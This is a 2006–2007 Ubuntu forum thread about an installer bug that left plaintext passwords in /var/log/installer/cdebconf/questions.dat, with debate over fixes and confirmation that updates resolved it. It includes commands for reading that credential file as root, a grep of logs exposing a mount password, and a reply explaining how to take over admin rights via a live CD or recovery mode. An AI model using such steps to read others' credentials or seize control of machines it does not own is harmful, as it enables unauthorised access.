as for anyone claiming someone should be drug over the coals for this one.... what if the dev team had found and fixed this without the community publicity it got?  understand that this is the reality in a project this large.  history has shown exploitable holes can lay around for years before someone finds them.  i can't recall how many times i have been forced to change a password for some kind of exploit, but ultimately the ones that only require that level of a fix to render the exploit impotent are pretty trivial.

---

### Post by raghav_p on 2006-03-16
After reading the Slashdot article on Automatix, I realized that since Automatix enabled the root account, the root password is the same as the password from the primary sudo account. Assuming that the primary sudo account password is still the same as from the installation, the bug  would have contained the root account password. The root password wouldn't have changed if/when you changed your primary account passwd.

Long story short, if you have Automatix, you might want to change the root password too.

Hope this helps someone.

- Raghav

---

### Post by Sutekh on 2006-03-16
[QUOTE=raghav_p]After reading the Slashdot article on Automatix, I realized that since Automatix enabled the root account, the root password is the same as the password from the primary sudo account. [/QUOTE]
When you enable the root account via Automatix you are prompted for another password for the root account.  It doesn't take the user's sudo password by default.  I suppose someone could have used the same password when enabling the root account.

---

### Post by raghav_p on 2006-03-16
[QUOTE=Sutekh]When you enable the root account via Automatix you are prompted for another password for the root account.  It doesn't take the user's sudo password by default.  I suppose someone could have used the same password when enabling the root account.[/QUOTE]

I was unaware of that. But if you did use the same root password, it might be beneficial to change it.

---

### Post by LordHunter317 on 2006-03-19
[QUOTE=j5tixc]You can deny this all you want[/quote]No one's denying anything.

>  but there are solutions and coding practices that greately reduce the risk of problems like these.No one's named any that are appropriate to this situation because anyone outside of Canonical likely cannot, as I've said multiple times.

>  Just look at the NetBSD installer, it runs the passwd command directly during installation, so the installer never sees the password.The NetBSD installer isn't remotely comparable to the Ubuntu installer.  What it does isn't a solution at all.  This goes with what I said far eariler: "There's more to this than just the security issue."

If you can't understand that, please don't suggest solutions.  If you're unaware of what the other issues are, then please don't suggest solutions.  It doesn't help anything, because people will think they are solutions when they are anything but.

---

### Post by Dml on 2006-03-19
I think it would be great if those who go on with such attitude would also apply this attitude to themselves. [edit]Especially last paragraph.[/edit]

---

### Post by LordHunter317 on 2006-03-19
Such as?  When you can show me how dropping out of the GUI installer to the raw command line and running passwd is a valid solution for Ubuntu, I'll retract.  It clearly and obviously goes against many of the goals of the installer and the project as a whole, and no one has demonstrated that the security flaw that occured in this case is worth compromising those other goals.

Frankly, even bringing up the NetBSD installer is in my mind, insulting to the team.  You don't think they'd run passwd if it were the correct technological solution?  That's an *obvious* solution, with obvious reasons as to why it doesn't work.  It doesn't take more than about 30 seconds of thought as to why it needs to be rejected.

---

### Post by j5tixc on 2006-03-20
[QUOTE=LordHunter317]Such as?  When you can show me how dropping out of the GUI installer to the raw command line and running passwd is a valid solution for Ubuntu, I'll retract.  It clearly and obviously goes against many of the goals of the installer and the project as a whole, and no one has demonstrated that the security flaw that occured in this case is worth compromising those other goals.[/QUOTE]

Well how about letting the installer pass the relevant data directly to passwd without storing it anywhere in between. But I guess that's also a too obvious solution that your team of geniuses have rejected. Funny how every one else is improving their security and doing a good job of it while you're just chanting "can't be done, can't be done". It's quite hard to understand why when other teams have obviously done it, but I guess it might be a question of attitude. If your mind is set on impossible then you won't be able to do it.

---

### Post by Bil-E-daKid on 2006-03-20
<rant>

Come on guys, can't we stop the mudslinging and just get on with our lives?

The basic fact is that these guys are providing us with a damned fantastic product for free.  We are free to use it or not.

Just apt-get upgrade and be done with it.  Security problems are going to happen from time to time - as we all know - *no one* is perfect.  But that's why we can apply security updates isn't it?

Let's face it, most people running linux are going to be at least a little more aware than your average windows user and knowledgable enough to run the updates when they come.

So someone made a mistake? Big deal!  At least we don't have to worry about some bunch of guys somewhere hiding all sorts of hoo-har from us and locking us into proprietary things without so much as a choice.

</rant>

---

### Post by LordHunter317 on 2006-03-20
[QUOTE=j5tixc]Well how about letting the installer pass the relevant data directly to passwd without storing it anywhere in between.[/quote]Are you even aware of what that would involve? **If not, please stop suggesting it.**

>  But I guess that's also a too obvious solution that your team of geniuses have rejected.Because it's not a solution at all.  The installer isn't mean to just drop to the command line, run a command, and return.  Even if it were really meant to do that, it would ruin the interface and is questionable anyway for other reasons.  

More importantly, if an X11 installer is ever to be done, like the one in Dapper Drake, it won't work for that case.

> Funny how every one else is improving their security and doing a good job of it while you're just chanting "can't be done, can't be done".No, that wasn't what I said.  Kindly learn to read.  What I said was this repeated solution isn't a solution.  What I further went to say is that there probably isn't a *good* solution that will prevent these kind of honest error bugs from cropping up again.

But lets see who else is vulernable to them:[list][*]Windows 2000[*]Windows XP[*]Windows 2003 Server[*]RedHat[*]Anyone else using Anaconda (CentOS,  Fedora Core, Mandriva last I checked)[*]Debian[/list]This sort of bug could have bit any of them, because they all have installers that require passwords to be treated specially.  And if passwords aren't treated specially, issues like this occur.

> It's quite hard to understand whyNot if you understand the software involved or fundamentals of software engineering.

>  when other teams have obviously done it, but I guess it might be a question of attitude.Yes, yours.  As I said, passwd is the **obvious** solution.  As such, if it really worked, why do you think Debian didn't use it originally for the new installer?

Because it doesn't work for the installer, that's why.  It can't do what the installer can.

---

### Post by Dml on 2006-03-21
Why wouldn't it be valid solution for ubuntu to run simple script that shows ncurses dialog for entering username and password, and adds user directly without storing password in any databases or anything like that? Without requiring programmer to keep two separate pieces of code in synch? Also, it's ubuntu's equivalent of running passwd.

as about "raw command line" or BSD, i didn't say anything about BSD or command line.

---

### Post by PaulL on 2006-03-23
As a new user of this system can I add (to this increasingly fractious and unhelpful thread) what I want.
1. I want to be able to use the root account. Preferably from the first time the machine is used after installation - i.e. during installation to be asked for a root password. 
2. I don't want other users to have root privileges (i.e. sudo asking for the USERS password).
3. I don't want any passwords to be stored unencrypted.

---

### Post by Gustav on 2006-03-23
1 & 2: It's just the first user that get the right to use sudo (automatically), so it isn't a security flaw in any way (unless you use the same user account for several users). I like the sudo model better than the su model, some like the su model more, but they are equally safe.

3: It was a BUG, _not intentional_. It could have happend to any OS (except maybe *BSD :))

---

### Post by Bil-E-daKid on 2006-03-23
PaulL, all of those things you want are available with the Breezy install*

You'll be prompted for a root password and, should you enter one, there'll be a root account with that password and no sudo access for other users.  (If you don't enter a root password, then the root account is disabled and the first user has sudo access).

As for the unencrypted thing, that is how Ubuntu works (apart from this bug which has now been fixed - so would go away at the first apt-get upgrade after your new installation - or not happen at all if you install dapper).

*Maybe only in expert mode - that's normally what I use to install Ubuntu so I'm not sure what's in the other mode.

---

### Post by Thunderbird750 on 2006-04-15
I see the last post is three weeks ago.  I haven't found anything that states this was solved for new installations from recently down loaded images.

Having completed an install today, I can find no trace of my passwords in the questions.dat file

# ls -l /var/log/installer/cdebconf/questions.dat
-rw-------  1 root root 62057 2006-04-15 08:24 /var/log/installer/cdebconf/questions.dat

and the file seems to locked to root, in any case (good choice).

If this is resolved for new installations, it might be very helpful if some admin person modified the first post in this thread to indicate new installs are resolved (long thread to read to learn that).  Indicating what date the install materials should be considered "ok" for this would be better still.

---

### Post by Anthron on 2006-04-18
Downloaded ISOs and installed yesterday, passwords were in plain sight. Glad I read this! Thanks.

---

### Post by Ob1 on 2006-04-29
I just saw my user name not my password.

and i had to use sudo to open it, so even if the password was there you had to type in the password before you get access

---

### Post by Warsong71 on 2006-05-02
Yeah, was wondering if I go through recovery mode in my dual boot menu is it possible to read the file?  I have managed to lose my username and password and this bug seems like the best way to quickly find the answer.  Only problem is I can't log in at all.

---

### Post by acorn22 on 2006-06-12
I'm not at ubuntu right now, but you could just change your password after install, right? I mane does it update this file every time you change ur pass?

---

### Post by aysiu on 2006-06-12
acorn22, the problem has been patched in Breezy and doesn't exist in Dapper.

---

### Post by nlogax on 2006-06-12
[QUOTE=acorn22]I'm not at ubuntu right now, but you could just change your password after install, right? I mane does it update this file every time you change ur pass?[/QUOTE]

That's correct, Acorn - it's only captured at install time.

BTW, if you've done an update of your system anytime recently then the password that was in the file will have been blanked anyway.

---

### Post by mawhamba on 2006-06-26
I grepped /var/log and found my root password as well as the password to my shared shared Windows folders listed -- are the saved clear-text shared folders passwords a major concern or are these cleared when the system shuts down??

(Passwords changed to protect **my** innocence):

```
user@ubox:/var/log$ sudo grep password *
auth.log:Jun 23 22:35:25 localhost sudo: user : TTY=pts/1 ; PWD=/home/user ; USER=root ; COMMAND=/bin/mount //192.168.1.100/My%Documents/ -o username==windowsuser, password=password
auth.log:Jun 23 22:35:35 localhost sudo: user : TTY=pts/1 ; PWD=/home/user ; USER=root ; COMMAND=/bin/mount //192.168.1.100/My%Documents/ -o username==windowsuser, password=password
auth.log:Jun 26 18:40:35 localhost sudo: user : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/grep password acpid acpid.1.gz auth.log auth.log.0 bootstrap.log btmp clamav cups daemon.log daemon.log.0 debug debug.0 dmesg dpkg.log evms-engine.1.log evms-engine.2.log evms-engine.3.log evms-engine.4.log evms-engine.5.log evms-engine.6.log evms-engine.7.log evms-engine.log faillog fontconfig.log gdm installer kern.log kern.log.0 kern.log.1.gz kern.log.2.gz lastlog lpr.log mail.err mail.info mail.log mail.warn messages messages.0 messages.1.gz messages.2.gz mysql mysql.err mysql.log mysql.log.1.gz mysql.log.2.gz nessus news preload.log preload.log.1.gz preload.log.2.gz samba scrollkeeper.log scrollkeeper.log.1 syslog syslog.0 syslog.1.gz syslog.2.gz syslog.3.gz udev unattended-upgrades user.log user.log.0 uucp.log vmware wtmp wvdialconf.log Xorg.0.log Xorg.0.log.old
auth.log:Jun 26 18:43:48 localhost sudo: user : TTY=pts/0 ; PWD=/var/log/installer ; USER=root ; COMMAND=/bin/grep password partman syslog version
auth.log:Jun 26 18:43:58 localhost sudo: user : TTY=pts/0 ; PWDo=/var/log/samba ; USER=root ; COMMAND=/bin/grep password log. log.127.0.0.1 log.192.168.1.101 log.ubox log.nmbd log.nmbd.1.gz log.smbd log.smbd.1.gz
auth.log:Jun 26 18:44:08 localhost sudo: user : TTY=pts/0 ; PWD=/var/log/installer ; USER=root ; COMMAND=/bin/grep password partman syslog version


```

---

### Post by RavenOfOdin on 2006-06-26
Holy crap!
I don't think I need to concern myself with this, though. . .since 

1) I've already changed my passwords a hell of a lot since install.
2) I'm running Dapper currently and the bug should be gone. For my iMac, which has a Breezy that is being reinstalled and isn't Internet-ready, I can easily delete the file.
3) Since this bug was according to the thread here fixed around mid-March, the first update I ever did for Breezy - on post-install - most likely wiped this issue out.

*note to self: check sticky threads* :p

---

### Post by totallyconfused! on 2006-06-29
I have a problem here...My boyfriend set this account up for me......We are not together anymore and he wont give me the frikken admin password so i cant download anything....cant use my printer...webcam...cant play yahoo games....i cant even fix the time on here...Can someone help me? Is there a way i can bypass all this??? Hes never gonna give it to me and im frustrated!:mad:

---

### Post by Klaidas on 2006-06-29
Well, by default root passwords is the same as your user accoutn password.
As bypassing that, I don't think it's possible

---

### Post by aysiu on 2006-06-29
[QUOTE=totallyconfused!]I have a problem here...My boyfriend set this account up for me......We are not together anymore and he wont give me the frikken admin password so i cant download anything....cant use my printer...webcam...cant play yahoo games....i cant even fix the time on here...Can someone help me? Is there a way i can bypass all this??? Hes never gonna give it to me and im frustrated!:mad:[/QUOTE]
Use a live CD and add yourself to the admin group in /etc/group

Or boot into recovery mode and do it.

[http://www.psychocats.net/ubuntu/sudo](http://www.psychocats.net/ubuntu/sudo)

After that, break up with him.

---

### Post by watitije on 2006-07-12
How do you get to the file?

---

### Post by airtonix on 2006-07-14
no need to worry dude, its already been fixed......thats is if you have your updates....errrr....up to date..

if still confused please read through this thread again, paying attention to the dates....not doing this has tripped me up a few times :)

---

### Post by macgig on 2006-07-16
file is there for me, but I cant open it. says I dont have sufficient rights. has a little red X next to the icon, upper right corner

---

### Post by airtonix on 2006-09-30
> **macgig said:**
> file is there for me, but I cant open it. says I dont have sufficient rights. has a little red X next to the icon, upper right corner

use the way of the sudo.

$ sudo leafpad  /var/log/installer/cdebconf/questions.dat

---

### Post by aysiu on 2006-09-30
Translation of airtonix instructions:

**sudo** - with administrative privileges
**leafpad** - open with the leafpad text editor
**/var/log/installer/cdebconf/questions.dat** - this file in this path

You could just as easily substitute in any other text editor, too: ```
sudo nano -B /var/log/installer/cdebconf/questions.dat
``` That'll open it with Nano and also make a backup copy at the same time. This will work with any Ubuntu version ```
gksudo gedit /var/log/installer/cdebconf/questions.dat
``` will open it with Gedit (Ubuntu) ```
kdesu kwrite /var/log/installer/cdebconf/questions.dat
``` will open it with KWrite (Kubuntu) ```
gksudo mousepad /var/log/installer/cdebconf/questions.dat
``` will open it with Mousepad (Xubuntu)

---

### Post by ubustu on 2006-10-05
Just a quick update for all you guys still running version 5.10 (breezy)
When you install it just choose a simple password like 1234 and then once your setup change your password via the gui.

The logs only store the password used during setup which should be changed anyway..... Windows is the same ;)

---

### Post by Frak on 2006-10-18
I think I'm going to file a security issue.

---

### Post by aysiu on 2006-10-18
> **Frak said:**
> I think I'm going to file a security issue.
Why? It's been fixed already. As long as you keep your Breezy updated, you should be fine.

---

### Post by dannyboy79 on 2006-10-31
i can tell you that after I read this I looked thru the entire file and found that since I setup my wireless pc card during the install my SSID name as well as my WEP key are all there in plain site. The file is however only viewable by root so I guess this is ok. Still kind of a dumb idea to document the settings used when the installer ran isn't it, exspecially the WEP key? I have changed the file so now it doesn't contain my key any longer. Also, it never did have the username and password in plain site so that was good. It is ok that I removed my SSID and my WEP key from this file correct?

---

### Post by Kira-cjd on 2006-11-02
well it works lol :D

---

### Post by lango2006 on 2006-11-24
Orite m8 ive got into a bit of trouble wiv me pc i am the asministrator and i cant log in what are the exact files that u have to go into to get to /var/log/installer/cdebconf/questions.dat???

---

### Post by airtonix on 2007-04-02
[lango2006]("http://www.ubuntuforums.org/member.php?u=199247") : you mean you have been dumped to the terminal(fully terminal) as root? if so....(shame on me ...i solved this by reinstalling....which isnt a biggie for me since i keep my home directories on another partition, id id this with windows and i'll do it with any system i get. especially if i can do some form of partition imaging)

but to overcome this insanly old problem....

GUI:
1 open up synaptic (System > Administration > Synaptic Package Manager)
2  click "mark all updates"
3 click "apply"
4 confirm confirm confirm.....wait.
5. bing updated, security fixed.

CLI:

> $ sudo apt-get update && sudo apt-get upgradeor if your in feisty you can run this to clean thigs up : 

> $ sudo apt-get autoremove

ps: if your in feisty this bug shouldnt even be there. grin grin

---

### Post by ryanVickers on 2007-05-23
> There is a file that contains all the installation logs :
/var/log/installer/cdebconf/questions.dat
In this file, there is all the questions asked to the user abd all the user's answers.

So, near the end of the file, we can find the user created during the installation... and its password (not hidden).

Oh my, that sounds like a real problem 0_0

But I looked at mine, and it was empty - the whole document.  I wonder where else there could be problems like this!  You would think that in the early stages of creating the distro/OS, they would have noticed this as a problem!

---

### Post by aysiu on 2007-05-23
Uh, this problem has long since been fixed. I'm closing this thread before it unnecessarily alarms even more users.

---

